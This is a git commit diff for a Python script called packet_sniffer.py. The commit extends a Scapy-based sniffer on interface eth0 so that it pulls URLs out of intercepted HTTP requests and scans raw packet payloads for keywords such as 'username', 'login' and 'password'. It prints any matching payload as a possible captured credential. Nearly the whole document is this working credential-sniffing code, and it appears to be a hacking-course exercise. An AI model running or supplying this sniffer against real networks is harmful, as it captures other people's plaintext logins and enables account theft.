113eacd5493b6b4d9fed68693715c8c02d1bd8da
root <root@localhost.localdomain>
2019-08-03 17:43:12 -0400

    Add changes to packet_sniffer.py

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,11 +1,12 @@
+#!/usr/bin/env python
+
 """
 Packet Sniffer
 
 """
 
-
 import scapy.all as scapy
-from scapy.layers import http
+from scapy_http import http
 
 
 def sniff(interface):
@@ -18,10 +19,29 @@ def sniff(interface):
             prn=process_sniffed_packet
             )
 
+def get_url(packet):
+    host = packet[http.HTTPRequest].Host or ""
+    path = packet[http.HTTPRequest].Path or ""
+    return host + path
+
+
+def get_login(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "user", "usr", "login", "password"]
+        for kw in keywords:
+            if kw in load:
+                return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + str(url))
+        login_info = get_login(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+        
 
 
 sniff("eth0")
